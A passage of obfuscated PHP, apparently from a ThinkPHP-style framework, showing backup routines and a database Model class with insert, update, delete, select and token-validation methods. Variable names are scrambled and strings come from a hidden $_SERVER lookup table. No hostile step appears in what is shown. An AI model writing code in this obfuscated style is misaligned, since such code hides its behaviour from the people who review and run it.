($šì„À‚Á[$°€øµ“Ç[293]][$°€øµ“Ç[765]][$°€øµ“Ç[757]] == $°€øµ“Ç[88]) { return !0; } $×ÄÉàÓ = new BackupDb(); if (!$×ÄÉàÓ->index()) { return !1; } self::set(array($°€øµ“Ç[781] => 1)); return !0; } public function dbFile() { $§ÃÁ°ËÕ =& $_SERVER[şÒÁøÒÄ]; $Áğœè¥¦ = self::get(); if ($Áğœè¥¦[$§ÃÁ°ËÕ[293]][$§ÃÁ°ËÕ[770]][$§ÃÁ°ËÕ[757]] == $§ÃÁ°ËÕ[88]) { return !0; } $ê°„ßØ = new BackupDbFile(); if (!$ê°„ßØ->index()) { return !1; } self::set(array($§ÃÁ°ËÕ[782] => 1)); return !0; } public function file() { $¬éšÚ§ =& $_SERVER[şÒÁøÒÄ]; $úÖô¢‚ = self::get(); if ($úÖô¢‚[$¬éšÚ§[293]][$¬éšÚ§[200]][$¬éšÚ§[757]] == $¬éšÚ§[88]) { return !0; } if (!isset($úÖô¢‚[$¬éšÚ§[762]]) || $úÖô¢‚[$¬éšÚ§[762]] == $¬éšÚ§[198]) { $ÖûÍé½§ = new BackupFile(); if (!$ÖûÍé½§->index()) { return !1; } } self::set(array($¬éšÚ§[783] => 1, $¬éšÚ§[757] => 1)); return !0; } } goto C°™“Î†Š³; Cî§é¡¡½‚: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\157\x72\144\x65\162", "\x61\154\x69\x61\163", "\x68\x61\166\x69\156\147", "\x67\x72\157\165\160", "\x6c\x6f\143\153", "\x64\x69\x73\164\151\156\x63\x74", "\x61\x75\164\x6f", "\146\x69\154\164\x65\x72", "\x76\x61\154\151\x64\141\x74\145", "\162\x65\163\x75\154\164", "\x62\151\156\x64", "\164\157\x6b\x65\x6e"); public function __construct($é¥Ë± = '', $ÑÚÉ °è = '', $Á±«Ã³¯ = '') { $¯€«¢¸¤ =& $_SERVER[şÒÁøÒÄ]; $this->_initialize(); if (!empty($é¥Ë±)) { if (strpos($é¥Ë±, $¯€«¢¸¤[10])) { list($this->dbName, $this->name) = explode($¯€«¢¸¤[10], $é¥Ë±); } else { $this->name = $é¥Ë±; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ÑÚÉ °è)) { $this->tablePrefix = $¯€«¢¸¤[12]; } elseif ($¯€«¢¸¤[12] != $ÑÚÉ °è) { $this->tablePrefix = $ÑÚÉ °è; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¯€«¢¸¤[244]); } $this->db(0, empty($this->connection) ? $Á±«Ã³¯ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $üÛ’„™ =& $_SERVER[şÒÁøÒÄ]; if (empty($this->fields)) { if (think_config($üÛ’„™[245])) { $ØÊÎ±ëŞ = $this->dbName ? $this->dbName : think_config($üÛ’„™[246]); $ŠÇÜ‡¹§ = think_var_cache($üÛ’„™[247] . strtolower(get_path_this($ØÊÎ±ëŞ) . $üÛ’„™[10] . $this->name)); if ($ŠÇÜ‡¹§) { $ÏÂÆÀ½û = think_config($üÛ’„™[248]); if (empty($ÏÂÆÀ½û) || $ŠÇÜ‡¹§[$üÛ’„™[249]] == $ÏÂÆÀ½û) { $this->fields = $ŠÇÜ‡¹§; return; } } } $this->flush(); } } public function flush() { $ç’‹÷ı =& $_SERVER[şÒÁøÒÄ]; $this->db->setModel($this->name); $ˆ‹æáäƒ = $this->db->getFields($this->getTableName()); if (!$ˆ‹æáäƒ) { return !1; } $this->fields = array_keys($ˆ‹æáäƒ); $this->fields[$ç’‹÷ı[250]] = !1; foreach ($ˆ‹æáäƒ as $ØÙ¨«õ¢ => $åº·’†À) { $¬·‰«[$ØÙ¨«õ¢] = $åº·’†À[$ç’‹÷ı[33]]; if ($åº·’†À[$ç’‹÷ı[39]]) { $this->fields[$ç’‹÷ı[251]] = $ØÙ¨«õ¢; if ($åº·’†À[$ç’‹÷ı[42]]) { $this->fields[$ç’‹÷ı[250]] = !0; } } } $this->fields[$ç’‹÷ı[252]] = $¬·‰«; if (think_config($ç’‹÷ı[248])) { $this->fields[$ç’‹÷ı[249]] = think_config($ç’‹÷ı[248]); } if (think_config($ç’‹÷ı[245])) { $üƒ‘áÂì = $this->dbName ? $this->dbName : think_config($ç’‹÷ı[246]); think_var_cache($ç’‹÷ı[247] . strtolower(get_path_this($üƒ‘áÂì) . $ç’‹÷ı[10] . $this->name), $this->fields); } } public function switchModel($à˜ôœ¬†, $‡Ó˜ı¨— = array()) { $öê“¿÷Ş =& $_SERVER[şÒÁøÒÄ]; $–š­ÄÛæ = ucwords(strtolower($à˜ôœ¬†)) . $öê“¿÷Ş[253]; if (!class_exists($–š­ÄÛæ)) { think_exception($–š­ÄÛæ . think_lang($öê“¿÷Ş[254])); } $this->_extModel = new $–š­ÄÛæ($this->name); if (!empty($‡Ó˜ı¨—)) { foreach ($‡Ó˜ı¨— as $îª¨İ©¯) { $this->_extModel->setProperty($îª¨İ©¯, $this->{$îª¨İ©¯}); } } return $this->_extModel; } public function __set($®ğ¿Áã, $îşø“©Ş) { $this->data[$®ğ¿Áã] = $îşø“©Ş; } public function __get($ŒúóÊµ±) { return isset($this->data[$ŒúóÊµ±]) ? $this->data[$ŒúóÊµ±] : null; } public function __isset($¥‰¨ô”ê) { return isset($this->data[$¥‰¨ô”ê]); } public function __unset($é§½Êãµ) { unset($this->data[$é§½Êãµ]); } public function __call($Ö©Û÷¨ë, $Á¸‹ë…´) { $€áÂğ =& $_SERVER[şÒÁøÒÄ]; if (in_array(strtolower($Ö©Û÷¨ë), $this->methods, !0)) { $this->options[strtolower($Ö©Û÷¨ë)] = $Á¸‹ë…´[0]; return $this; } elseif (in_array(strtolower($Ö©Û÷¨ë), array($€áÂğ[255], $€áÂğ[256], $€áÂğ[257], $€áÂğ[258], $€áÂğ[259]), !0)) { $°ª°‰ß  = isset($Á¸‹ë…´[0]) ? $Á¸‹ë…´[0] : $€áÂğ[189]; $°ª°‰ß  = $this->db->parseKey($°ª°‰ß ); return $this->getField(strtoupper($Ö©Û÷¨ë) . $€áÂğ[260] . $°ª°‰ß  . $€áÂğ[261] . $Ö©Û÷¨ë, $€áÂğ[255]); } elseif (strtolower(substr($Ö©Û÷¨ë, 0, 5)) == $€áÂğ[262]) { $°ª°‰ß  = think_parse_name(substr($Ö©Û÷¨ë, 5)); $Ú¦šîÑ¯[$°ª°‰ß ] = $Á¸‹ë…´[0]; return $this->where($Ú¦šîÑ¯)->find(); } elseif (strtolower(substr($Ö©Û÷¨ë, 0, 10)) == $€áÂğ[263]) { $î‚¥»ö· = think_parse_name(substr($Ö©Û÷¨ë, 10)); $Ú¦šîÑ¯[$î‚¥»ö·] = $Á¸‹ë…´[0]; return $this->where($Ú¦šîÑ¯)->getField($Á¸‹ë…´[1]); } elseif (isset($this->_scope[$Ö©Û÷¨ë])) { return $this->scope($Ö©Û÷¨ë, $Á¸‹ë…´[0]); } elseif (method_exists($this, $Ö©Û÷¨ë)) { array_unshift($Á¸‹ë…´, $Ö©Û÷¨ë); return call_user_func_array(array($this, $€áÂğ[264]), $Á¸‹ë…´); } else { return call_user_func_array(array(parent, $Ö©Û÷¨ë), $Á¸‹ë…´); } } protected function call() { $çë¹‘óŞ =& $_SERVER[şÒÁøÒÄ]; $—úêïš³ = func_get_args(); $Ø•ß²°† = array_shift($—úêïš³); $›…»Ø·Ÿ = $Ø•ß²°†; if (is_array($Ø•ß²°†)) { $›…»Ø·Ÿ = $Ø•ß²°†[1]; $Ø•ß²°† = $Ø•ß²°†[0]; } $œş±”•á = count($—úêïš³) - 1; if (isset($—úêïš³[$œş±”•á]) && $—úêïš³[$œş±”•á] === $Ø•ß²°†) { think_exception(__CLASS__ . $çë¹‘óŞ[4] . $Ø•ß²°† . think_lang($çë¹‘óŞ[265])); return; } $—úêïš³[] = $Ø•ß²°†; if (method_exists($this, $çë¹‘óŞ[266])) { $î”°ßÆÇ = call_user_func_array(array($this, $çë¹‘óŞ[267]), array($›…»Ø·Ÿ, $—úêïš³)); if (!is_null($î”°ßÆÇ) && $î”°ßÆÇ !== !1) { return $î”°ßÆÇ; } } $ ŠÍŞê¸ = call_user_func_array(array($this, $Ø•ß²°†), $—úêïš³); if (method_exists($this, $çë¹‘óŞ[268])) { $î”°ßÆÇ = call_user_func_array(array($this, $çë¹‘óŞ[269]), array($›…»Ø·Ÿ, $—úêïš³, $ ŠÍŞê¸)); if ($î”°ßÆÇ) { return $î”°ßÆÇ; } } return $ ŠÍŞê¸; } protected function _initialize() { } protected function _facade($ÖÍĞ¨Ø) { $îïå–™¶ =& $_SERVER[şÒÁøÒÄ]; if (!empty($this->fields)) { foreach ($ÖÍĞ¨Ø as $Ÿ‹³Ò¾ => $ûÍ®’Öø) { if (is_array($this->fields) && !in_array($Ÿ‹³Ò¾, $this->fields, !0)) { unset($ÖÍĞ¨Ø[$Ÿ‹³Ò¾]); } elseif (is_scalar($ûÍ®’Öø)) { $this->_parseType($ÖÍĞ¨Ø, $Ÿ‹³Ò¾); } } } if (!empty($this->options[$îïå–™¶[270]])) { $ÖÍĞ¨Ø = array_map($this->options[$îïå–™¶[270]], $ÖÍĞ¨Ø); unset($this->options[$îïå–™¶[270]]); } $this->_beforeWrite($ÖÍĞ¨Ø); return $ÖÍĞ¨Ø; } protected function _beforeWrite(&$¶Ä»Ù×È) { } public function add($úàà§ÄÓ = '', $ó¶µö£¡ = array(), $÷¬¸Ğ¥‚ = false) { if (empty($úàà§ÄÓ)) { if (!empty($this->data)) { $úàà§ÄÓ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[şÒÁøÒÄ][271]); return !1; } } $ó¶µö£¡ = $this->_parseOptions($ó¶µö£¡); $úàà§ÄÓ = $this->_facade($úàà§ÄÓ); if (!1 === $this->_beforeInsert($úàà§ÄÓ, $ó¶µö£¡)) { return !1; } $áíÍ‘Å¼ = $this->db->insert($úàà§ÄÓ, $ó¶µö£¡, $÷¬¸Ğ¥‚); if (!1 !== $áíÍ‘Å¼) { $º§‰´„’ = $this->getLastInsID(); if ($º§‰´„’) { $úàà§ÄÓ[$this->getPk()] = $º§‰´„’; $this->_after_insert($úàà§ÄÓ, $ó¶µö£¡); return $º§‰´„’; } $this->_after_insert($úàà§ÄÓ, $ó¶µö£¡); } return $áíÍ‘Å¼; } protected function _beforeInsert(&$Â»òş—», $°‘é°•Ğ) { } protected function _after_insert($ Å¸¥¹İ, $†Ú‰ØªĞ) { } public function addAll($œ€†âÑæ, $ë­›’˜ğ = array(), $ƒØêä”‹ = false) { $›¿ŸœÆ¹ =& $_SERVER[şÒÁøÒÄ]; if (empty($œ€†âÑæ)) { $this->error = think_lang($›¿ŸœÆ¹[271]); return !1; } $ë­›’˜ğ = $this->_parseOptions($ë­›’˜ğ); foreach ($œ€†âÑæ as $÷“‡˜¸í => $ù“‡¬›Ù) { $œ€†âÑæ[$÷“‡˜¸í] = $this->_facade($ù“‡¬›Ù); } if (method_exists($this->db, $›¿ŸœÆ¹[272])) { $´ËÖ¾À„ = $this->db->insertAll($œ€†âÑæ, $ë­›’˜ğ, $ƒØêä”‹); } else { $this->startTrans(); foreach ($œ€†âÑæ as $÷“‡˜¸í => $ù“‡¬›Ù) { $´ËÖ¾À„ = $this->db->insert($ù“‡¬›Ù, $ë­›’˜ğ, $ƒØêä”‹); } $this->commit(); } if (!1 !== $´ËÖ¾À„) { $ËÆì¦ûÊ = $this->getLastInsID(); if ($ËÆì¦ûÊ) { return $ËÆì¦ûÊ; } } return $´ËÖ¾À„; } public function selectAdd($ø„ô¼ª¥ = '', $æ—ûäÃ÷ = '', $® ›©¾• = array()) { $ŒòèÙÔË =& $_SERVER[şÒÁøÒÄ]; $® ›©¾• = $this->_parseOptions($® ›©¾•); if (!1 === ($«ô´´Ÿ = $this->db->selectInsert($ø„ô¼ª¥ ? $ø„ô¼ª¥ : $® ›©¾•[$ŒòèÙÔË[273]], $æ—ûäÃ÷ ? $æ—ûäÃ÷ : $this->getTableName(), $® ›©¾•))) { $this->error = think_lang($ŒòèÙÔË[274]); return !1; } else { return $«ô´´Ÿ; } } public function save($Ö¾ıÔş = '', $çÃ¹¢µ = array()) { $ÏˆÖ‘†« =& $_SERVER[şÒÁøÒÄ]; if (empty($Ö¾ıÔş)) { if (!empty($this->data)) { $Ö¾ıÔş = $this->data; $this->data = array(); } else { $this->error = think_lang($ÏˆÖ‘†«[271]); return !1; } } $Ö¾ıÔş = $this->_facade($Ö¾ıÔş); $çÃ¹¢µ = $this->_parseOptions($çÃ¹¢µ); $é‹ç°÷ = $this->getPk(); if (!isset($çÃ¹¢µ[$ÏˆÖ‘†«[275]])) { if (isset($Ö¾ıÔş[$é‹ç°÷])) { $ß”£¼Î´[$é‹ç°÷] = $Ö¾ıÔş[$é‹ç°÷]; $çÃ¹¢µ[$ÏˆÖ‘†«[275]] = $ß”£¼Î´; unset($Ö¾ıÔş[$é‹ç°÷]); } else { $this->error = think_lang($ÏˆÖ‘†«[274]); return !1; } } if (is_array($çÃ¹¢µ[$ÏˆÖ‘†«[275]]) && isset($çÃ¹¢µ[$ÏˆÖ‘†«[275]][$é‹ç°÷])) { $À¥˜ûÖß = $çÃ¹¢µ[$ÏˆÖ‘†«[275]][$é‹ç°÷]; } if (!1 === $this->_beforeUpdate($Ö¾ıÔş, $çÃ¹¢µ)) { return !1; } $¼®ñäÇ = $this->db->update($Ö¾ıÔş, $çÃ¹¢µ); if (!1 !== $¼®ñäÇ) { if (isset($À¥˜ûÖß)) { $Ö¾ıÔş[$é‹ç°÷] = $À¥˜ûÖß; } $this->_afterUpdate($Ö¾ıÔş, $çÃ¹¢µ); } return $¼®ñäÇ; } protected function _beforeUpdate(&$æúßÆÌ¢, $ØŸÔÙüØ) { } protected function _afterUpdate($Ñõ†¬–ñ, $Æì ü´Ÿ) { } public function delete($†’é¾Í = array()) { $“íÊìœŒ =& $_SERVER[şÒÁøÒÄ]; if (empty($†’é¾Í) && empty($this->options[$“íÊìœŒ[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ıˆÃ£ğ = $this->getPk(); if (is_numeric($†’é¾Í) || is_string($†’é¾Í)) { if (strpos($†’é¾Í, $“íÊìœŒ[50])) { $³¶¶Š”ô[$ıˆÃ£ğ] = array($“íÊìœŒ[276], $†’é¾Í); } else { $³¶¶Š”ô[$ıˆÃ£ğ] = $†’é¾Í; } $this->options[$“íÊìœŒ[275]] = $³¶¶Š”ô; } $†’é¾Í = $this->_parseOptions(); if (is_array($†’é¾Í[$“íÊìœŒ[275]]) && isset($†’é¾Í[$“íÊìœŒ[275]][$ıˆÃ£ğ])) { $çª‹şë = $†’é¾Í[$“íÊìœŒ[275]][$ıˆÃ£ğ]; } $¶˜ğÎ§É = $this->db->delete($†’é¾Í); if (!1 !== $¶˜ğÎ§É) { $öÙØ„ôÖ = array(); if (isset($çª‹şë)) { $öÙØ„ôÖ[$ıˆÃ£ğ] = $çª‹şë; } $this->_after_delete($öÙØ„ôÖ, $†’é¾Í); } return $¶˜ğÎ§É; } protected function _after_delete($ĞÀç¾È, $‰úÜ½¦ƒ) { } public function select($Ñï–È– = array()) { $“ˆ°õ„ =& $_SERVER[şÒÁøÒÄ]; if (is_string($Ñï–È–) || is_numeric($Ñï–È–)) { $ôµÏõö = $this->getPk(); if (strpos($Ñï–È–, $“ˆ°õ„[50])) { $¸·Ó†Ÿ÷[$ôµÏõö] = array($“ˆ°õ„[276], $Ñï–È–); } else { $¸·Ó†Ÿ÷[$ôµÏõö] = $Ñï–È–; } $this->options[$“ˆ°õ„[275]] = $¸·Ó†Ÿ÷; } elseif (!1 === $Ñï–È–) { $Ñï–È– = $this->_parseOptions(); return $“ˆ°õ„[277] . $this->db->buildSelectSql($Ñï–È–) . $“ˆ°õ„[278]; } $Ñï–È– = $this->_parseOptions(); $­ö²±ùê = $this->db->select($Ñï–È–); if (!1 === $­ö²±ùê) { return !1; } if (empty($­ö²±ùê)) { return null; } $this->_afterSelect($­ö²±ùê, $Ñï–È–); return $­ö²±ùê; } protected function _afterSelect(&$¤Ö© ·Ä, $‘Ô¿Ïˆî) { } public function buildSql($¬ŠËüóÈ = array()) { $Š¶”éÜ° =& $_SERVER[şÒÁøÒÄ]; $¬ŠËüóÈ = $this->_parseOptions($¬ŠËüóÈ); return $Š¶”éÜ°[277] . $this->db->buildSelectSql($¬ŠËüóÈ) . $Š¶”éÜ°[278]; } public function optionsValue($™™ñëÕ— = null) { if (is_null($™™ñëÕ—)) { return $this->options; } elseif (is_array($™™ñëÕ—)) { $this->options = array_merge($this->options, $™™ñëÕ—); } } protected function _parseOptions($¦¸È´© = array()) { $Ñ´Ú·”’ =& $_SERVER[şÒÁøÒÄ]; if (is_array($¦¸È´©)) { $¦¸È´© = array_merge($this->options, $¦¸È´©); } $this->options = array(); if (!isset($¦¸È´©[$Ñ´Ú·”’[279]])) { $¦¸È´©[$Ñ´Ú·”’[279]] = $this->getTableName(); $ë¿º‰—â = $this->fields; } else { $ë¿º‰—â = $this->getDbFields(); } if (!empty($¦¸È´©[$Ñ´Ú·”’[280]])) { $¦¸È´©[$Ñ´Ú·”’[279]] .= $Ñ´Ú·”’[53] . $¦¸È´©[$Ñ´Ú·”’[280]]; } $¦¸È´©[$Ñ´Ú·”’[281]] = $this->name; if (isset($¦¸È´©[$Ñ´Ú·”’[275]]) && is_array($¦¸È´©[$Ñ´Ú·”’[275]]) && !empty($ë¿º‰—â) && !isset($¦¸È´©[$Ñ´Ú·”’[282]]) && !isset($¦¸È´©[$Ñ´Ú·”’[279]])) { foreach ($¦¸È´©[$Ñ´Ú·”’[275]] as $¶Ê­«¥Ì => $ô›‹­·Ë) { $¶Ê­«¥Ì = trim($¶Ê­«¥Ì); if (in_array($¶Ê­«¥Ì, $ë¿º‰—â, !0)) { if (is_scalar($ô›‹­·Ë)) { $this->_parseType($¦¸È´©[$Ñ´Ú·”’[275]], $¶Ê­«¥Ì); } } elseif (!is_numeric($¶Ê­«¥Ì) && $Ñ´Ú·”’[11] != substr($¶Ê­«¥Ì, 0, 1) && !1 === strpos($¶Ê­«¥Ì, $Ñ´Ú·”’[10]) && !1 === strpos($¶Ê­«¥Ì, $Ñ´Ú·”’[260]) && !1 === strpos($¶Ê­«¥Ì, $Ñ´Ú·”’[283]) && !1 === strpos($¶Ê­«¥Ì, $Ñ´Ú·”’[284])) { unset($¦¸È´©[$Ñ´Ú·”’[275]][$¶Ê­«¥Ì]); } } } $this->_options_filter($¦¸È´©); return $¦¸È´©; } protected function _options_filter(&$şĞµÎë©) { } protected function _parseType(&$ÇªĞÆÇ§, $Ø›íÒµæ) { $¹×ÅÄÔú =& $_SERVER[şÒÁøÒÄ]; if (empty($this->options[$¹×ÅÄÔú[285]][$¹×ÅÄÔú[4] . $Ø›íÒµæ])) { $¹Ÿ½‹Îô = strtolower($this->fields[$¹×ÅÄÔú[252]][$Ø›íÒµæ]); if (!1 !== strpos($¹Ÿ½‹Îô, $¹×ÅÄÔú[286])) { } elseif (!1 === strpos($¹Ÿ½‹Îô, $¹×ÅÄÔú[287]) && !1 !== strpos($¹Ÿ½‹Îô, $¹×ÅÄÔú[288])) { $ÇªĞÆÇ§[$Ø›íÒµæ] = intval($ÇªĞÆÇ§[$Ø›íÒµæ]); } elseif (!1 !== strpos($¹Ÿ½‹Îô, $¹×ÅÄÔú[289]) || !1 !== strpos($¹Ÿ½‹Îô, $¹×ÅÄÔú[290])) { $ÇªĞÆÇ§[$Ø›íÒµæ] = floatval($ÇªĞÆÇ§[$Ø›íÒµæ]); } elseif (!1 !== strpos($¹Ÿ½‹Îô, $¹×ÅÄÔú[291])) { $ÇªĞÆÇ§[$Ø›íÒµæ] = (bool) $ÇªĞÆÇ§[$Ø›íÒµæ]; } } } public function find($†Ïñü‘È = array()) { $ÙÙ‰‡èª =& $_SERVER[şÒÁøÒÄ]; if (is_numeric($†Ïñü‘È) || is_string($†Ïñü‘È)) { $¦É…íÕ[$this->getPk()] = intval($†Ïñü‘È); $this->options[$ÙÙ‰‡èª[275]] = $¦É…íÕ; } $this->options[$ÙÙ‰‡èª[292]] = 1; $†Ïñü‘È = $this->_parseOptions(); $ñŞ”—‰ = $this->db->select($†Ïñü‘È); if (!1 === $ñŞ”—‰) { return !1; } if (empty($ñŞ”—‰)) { return null; } $this->data = $ñŞ”—‰[0]; $this->_afterFind($this->data, $†Ïñü‘È); if (!empty($this->options[$ÙÙ‰‡èª[293]])) { return $this->returnResult($this->data, $this->options[$ÙÙ‰‡èª[293]]); } return $this->data; } protected function _afterFind(&$‘™ˆºÙé, $Ê­ëÀı¾) { } protected function returnResult($ş´õ’Ü, $‹Á†ÚË = '') { $¡é¨íëÂ =& $_SERVER[şÒÁøÒÄ]; if ($‹Á†ÚË) { if (is_callable($‹Á†ÚË)) { return call_user_func($‹Á†ÚË, $ş´õ’Ü); } switch (strtolower($‹Á†ÚË)) { case $¡é¨íëÂ[294]: return json_encode($ş´õ’Ü); case $¡é¨íëÂ[295]: return xml_encode($ş´õ’Ü); } } return $ş´õ’Ü; } public function parseFieldsMap($”çŸÖÃ, $¿ÁŒ’óƒ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¯óÀÕşˆ => $‚ì‘ì’) { if ($¿ÁŒ’óƒ == 1) { if (isset($”çŸÖÃ[$‚ì‘ì’])) { $”çŸÖÃ[$¯óÀÕşˆ] = $”çŸÖÃ[$‚ì‘ì’]; unset($”çŸÖÃ[$‚ì‘ì’]); } } else { if (isset($”çŸÖÃ[$¯óÀÕşˆ])) { $”çŸÖÃ[$‚ì‘ì’] = $”çŸÖÃ[$¯óÀÕşˆ]; unset($”çŸÖÃ[$¯óÀÕşˆ]); } } } } return $”çŸÖÃ; } public function setField($¢Ê®²‰û, $Äú·Ê = '') { if (is_array($¢Ê®²‰û)) { $Ü„ŸÁÒ = $¢Ê®²‰û; } else { $Ü„ŸÁÒ[$¢Ê®²‰û] = $Äú·Ê; } return $this->save($Ü„ŸÁÒ); } public function setAdd($™¥ü½Âô, $˜·‡À­£ = 1) { $Úàµ¿è› =& $_SERVER[şÒÁøÒÄ]; $ØÛñ¡±Ä = $™¥ü½Âô . $Úàµ¿è›[296] . $˜·‡À­£; if ($˜·‡À­£ < 0) { $ØÛñ¡±Ä = $™¥ü½Âô . $˜·‡À­£; } return $this->setField($™¥ü½Âô, array($Úàµ¿è›[297], $ØÛñ¡±Ä)); } public function getField($¡—Ï¢é„, $ƒ’Ÿ·¢ = null) { $â°Ÿ£–É =& $_SERVER[şÒÁøÒÄ]; $¼¬«œË[$â°Ÿ£–É[273]] = $¡—Ï¢é„; $¼¬«œË = $this->_parseOptions($¼¬«œË); $¡—Ï¢é„ = trim($¡—Ï¢é„); if (strpos($¡—Ï¢é„, $â°Ÿ£–É[50])) { if (!isset($¼¬«œË[$â°Ÿ£–É[292]])) { $¼¬«œË[$â°Ÿ£–É[292]] = is_numeric($ƒ’Ÿ·¢) ? $ƒ’Ÿ·¢ : $â°Ÿ£–É[12]; } $¸şÍ÷¾ô = $this->db->select($¼¬«œË); if (!empty($¸şÍ÷¾ô)) { $éÀâÙ–¨ = explode($â°Ÿ£–É[50], $¡—Ï¢é„); $¡—Ï¢é„ = array_keys($¸şÍ÷¾ô[0]); $ë“âêºò = array_shift($¡—Ï¢é„); $ÄİõÃ‚ˆ = array_shift($¡—Ï¢é„); $ğø•ò¿ò = array(); $Ãšó“ù = count($éÀâÙ–¨); foreach ($¸şÍ÷¾ô as $üŠÄîÌ) { $üÆÌßğ = $üŠÄîÌ[$ë“âêºò]; if (2 == $Ãšó“ù) { $ğø•ò¿ò[$üÆÌßğ] = $üŠÄîÌ[$ÄİõÃ‚ˆ]; } else { $ğø•ò¿ò[$üÆÌßğ] = is_string($ƒ’Ÿ·¢) ? implode($ƒ’Ÿ·¢, $üŠÄîÌ) : $üŠÄîÌ; } } return $ğø•ò¿ò; } } else { if (!0 !== $ƒ’Ÿ·¢) { $¼¬«œË[$â°Ÿ£–É[292]] = is_numeric($ƒ’Ÿ·¢) ? $ƒ’Ÿ·¢ : 1; } if ($ƒ’Ÿ·¢ === $â°Ÿ£–É[255]) { unset($¼¬«œË[$â°Ÿ£–É[292]]); } $üŠÄîÌ = $this->db->select($¼¬«œË); if (!empty($üŠÄîÌ)) { if ($ƒ’Ÿ·¢ === $â°Ÿ£–É[255]) { return reset($üŠÄîÌ[0]); } if (!0 !== $ƒ’Ÿ·¢ && 1 == $¼¬«œË[$â°Ÿ£–É[292]]) { return reset($üŠÄîÌ[0]); } foreach ($üŠÄîÌ as $í®ä¡¥À) { $è‰Ù¤ç†[] = $í®ä¡¥À[$¡—Ï¢é„]; } return $è‰Ù¤ç†; } } return null; } public function create($Û©¦´Ş× = '', $ë¨Ûµ¯Ë = '') { $°¥’Ñİ =& $_SERVER[şÒÁøÒÄ]; if (empty($Û©¦´Ş×)) { $Û©¦´Ş× = $_POST; } elseif (is_object($Û©¦´Ş×)) { $Û©¦´Ş× = get_object_vars($Û©¦´Ş×); } if (empty($Û©¦´Ş×) || !is_array($Û©¦´Ş×)) { $this->error = think_lang($°¥’Ñİ[271]); return !1; } $Û©¦´Ş× = $this->parseFieldsMap($Û©¦´Ş×, 0); $ë¨Ûµ¯Ë = $ë¨Ûµ¯Ë ? $ë¨Ûµ¯Ë : (!empty($Û©¦´Ş×[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$°¥’Ñİ[273]])) { $üê£Àåã = $this->options[$°¥’Ñİ[273]]; unset($this->options[$°¥’Ñİ[273]]); } elseif ($ë¨Ûµ¯Ë == THINK_MODEL_INSERT && isset($this->insertFields)) { $üê£Àåã = $this->insertFields; } elseif ($ë¨Ûµ¯Ë == THINK_MODEL_UPDATE && isset($this->updateFields)) { $üê£Àåã = $this->updateFields; } if (isset($üê£Àåã)) { if (is_string($üê£Àåã)) { $üê£Àåã = explode($°¥’Ñİ[50], $üê£Àåã); } if (think_config($°¥’Ñİ[298])) { $üê£Àåã[] = think_config($°¥’Ñİ[299]); } foreach ($Û©¦´Ş× as $çÄî· => $ÙîËƒ—Ç) { if (!in_array($çÄî·, $üê£Àåã)) { unset($Û©¦´Ş×[$çÄî·]); } } } if (!$this->autoValidation($Û©¦´Ş×, $ë¨Ûµ¯Ë)) { return !1; } if (!$this->autoCheckToken($Û©¦´Ş×)) { $this->error = think_lang($°¥’Ñİ[300]); return !1; } if ($this->autoCheckFields) { $üê£Àåã = $this->getDbFields(); foreach ($Û©¦´Ş× as $çÄî· => $ÙîËƒ—Ç) { if (!in_array($çÄî·, $üê£Àåã)) { unset($Û©¦´Ş×[$çÄî·]); } elseif (MAGIC_QUOTES_GPC && is_string($ÙîËƒ—Ç)) { $Û©¦´Ş×[$çÄî·] = stripslashes($ÙîËƒ—Ç); } } } $this->autoOperation($Û©¦´Ş×, $ë¨Ûµ¯Ë); $this->data = $Û©¦´Ş×; return $Û©¦´Ş×; } public function autoCheckToken($Ôî¶ÁÜï) { $á§Å¨‘’ =& $_SERVER[şÒÁøÒÄ]; if (isset($this->options[$á§Å¨‘’[301]]) && !$this->options[$á§Å¨‘’[301]]) { return !0; } if (think_config($á§Å¨‘’[298])) { $å¦ş‚ì = think_config($á§Å¨‘’[299]); if (!isset($Ôî¶ÁÜï[$å¦ş‚ì]) || Session::get($å¦ş‚ì)) { return !1; } list($ÂİŞ÷ß», $ßÅæ´úú) = explode($á§Å¨‘’[11], $Ôî¶ÁÜï[$å¦ş‚ì]); if ($ßÅæ´úú && Session::get($å¦ş‚ì . $á§Å¨‘’[10] . $ÂİŞ÷ß») === $ßÅæ´úú) { Session::remove($å¦ş‚ì . $á§Å¨‘’[10] . $ÂİŞ÷ß»); return !0; } if (think_config($á§Å¨‘’[302])) { Session::remove($å¦ş‚ì . $á§Å¨‘’[10] . $ÂİŞ÷ß»); } return !1; } return !0; } public function regex($ı¥‰’—ó, $ûüÀÈÛö) { $‘‚Çƒâí =& $_SERVER[şÒÁøÒÄ]; $—Å½¦ä = array($‘‚Çƒâí[303] => $‘‚Çƒâí[304], $‘‚Çƒâí[305] => $‘‚Çƒâí[306], $‘‚Çƒâí[307] => $‘‚Çƒâí[308], $‘‚Çƒâí[309] => $‘‚Çƒâí[310], $‘‚Çƒâí[311] => $‘‚Çƒâí[312], $‘‚Çƒâí[313] => $‘‚Çƒâí[314], $‘‚Çƒâí[315] => $‘‚Çƒâí[316], $‘‚Çƒâí[290] => $‘‚Çƒâí[317], $‘‚Çƒâí[318] => $‘‚Çƒâí[319]); if (isset($—Å½¦ä[strtolower($ûüÀÈÛö)])) { $ûüÀÈÛö = $—Å½¦ä[strtolower($ûüÀÈÛö)]; } return preg_match($ûüÀÈÛö, $ı¥‰’—ó) === 1; } private function autoOperation(&$µçšÂêë, $‹¼¨Ë·º) { $ÇáãÚ =& $_SERVER[şÒÁøÒÄ]; if (!empty($this->options[$ÇáãÚ[320]])) { $¤Â¯Şƒé = $this->options[$ÇáãÚ[320]]; unset($this->options[$ÇáãÚ[320]]); } elseif (!empty($this->_auto)) { $¤Â¯Şƒé = $this->_auto; } if (isset($¤Â¯Şƒé)) { foreach ($¤Â¯Şƒé as 